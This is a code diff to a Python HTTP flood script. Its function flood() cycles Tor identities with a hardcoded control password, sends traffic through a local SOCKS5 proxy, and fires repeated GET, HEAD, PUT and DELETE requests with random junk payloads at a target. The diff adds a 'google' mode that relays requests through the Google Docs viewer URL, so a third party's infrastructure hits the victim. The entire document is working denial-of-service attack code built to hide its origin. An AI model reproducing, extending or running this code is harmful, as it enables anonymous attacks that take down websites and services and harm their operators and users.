@@ -35,8 +35,8 @@ def flood(target,domainname,attack,sock):
         controller.authenticate(password="taisaoem")
         controller.signal(Signal.NEWNYM)
 	
-    #payload = str(random._urandom(random.randint(10, 500)))
-    payload = randomurl()
+    payload = str(random._urandom(random.randint(10, 150)))
+    #payload = randomurl()
     if sock =='http':
         proxies = {'http': "socks5://127.0.0.1:9050"}
     elif sock =='https':
@@ -49,11 +49,11 @@ def flood(target,domainname,attack,sock):
             if attack =='get':
                 r = s.get(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             elif attack =='head':
-                r = s.head(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
+                r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
             elif attack =='put':
                 r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
-            elif attack =='patch':
-                r = s.patch(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
+            elif attack =='google':
+                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=4)
             elif attack =='delete':
                 r = s.delete(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             else:
@@ -65,8 +65,8 @@ def flood(target,domainname,attack,sock):
                 r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
             elif attack =='put':
                 r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
-            elif attack =='patch':
-                r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='google':
+                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=4)
             elif attack =='delete':
                 r = s.delete(target, params=payload, headers=headers, timeout=20 ,verify=False)
             else:
